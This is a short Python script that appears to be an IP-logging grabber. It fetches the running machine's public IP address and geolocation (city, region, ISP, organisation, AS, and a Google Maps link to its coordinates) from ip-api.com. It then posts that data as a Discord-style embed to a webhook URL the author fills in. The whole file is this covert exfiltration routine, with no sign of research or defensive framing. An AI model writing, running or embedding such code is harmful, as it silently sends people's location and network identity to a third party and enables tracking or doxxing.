import requests

hurl = ""

# Dont touch
url = "http://ip-api.com/json/"
r = requests.get(url)
geo = r.json()

data = {
  "embeds": [
    {
      "color": 65280,
      "fields": [
        {
          "name": "IP",
          "value": "{ip}".format(ip=geo["query"])
        },
        {
          "name": "Country",
          "value": "{country}".format(country=geo["country"])
        },
        {
          "name": "Region",
          "value": "{regionName}".format(regionName=geo["regionName"])
        },
        {
          "name": "City",
          "value": "{city}".format(city=geo["city"])
        },
        {
          "name": "Timezone",
          "value": "{timezone}".format(timezone=geo["timezone"])
        },
        {
          "name": "ISP",
          "value": "{isp}".format(isp=geo["isp"])
        },
        {
          "name": "ORG",
          "value": "{org}".format(org=geo["org"])
        },
        {
          "name": "AS",
          "value": "{aas}".format(aas=geo["as"])
        },
        {
          "name": "Google Map Link",
          "value": "[Map Link](https://www.google.com/maps/place/{lat},{lon})".format(lat=geo["lat"], lon=geo["lon"])
        },
      ]
    }
  ]
}

paylods = requests.post(hurl, json=data)
